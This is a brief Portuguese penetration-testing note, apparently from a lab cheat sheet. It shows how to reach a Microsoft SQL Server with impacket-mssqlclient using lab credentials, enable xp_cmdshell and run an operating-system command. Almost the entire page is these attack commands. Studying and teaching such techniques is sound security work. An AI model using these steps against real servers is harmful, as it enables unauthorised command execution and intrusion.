---
title: "MSSQL to Shell"
---

# MSSQL to Shell

Acesso ao MSSQL via impacket e ativação do `xp_cmdshell` para execução de comandos do sistema operacional. Requer credenciais válidas com permissões de sysadmin ou equivalente.

```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```
